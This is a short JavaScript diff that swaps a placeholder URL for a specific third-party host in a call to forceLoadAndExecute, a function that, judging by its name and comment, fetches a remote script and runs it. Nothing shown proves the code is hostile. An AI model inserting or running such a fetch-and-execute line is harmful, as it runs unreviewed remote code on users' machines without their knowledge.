@@ -6,4 +6,4 @@ function forceLoadAndExecute(url) {
 }
 
 // Example: Load external script (replace with any URL)
-forceLoadAndExecute("https://example.com/script.js");
+forceLoadAndExecute("https://foxscript.vercel.app/functions.c");
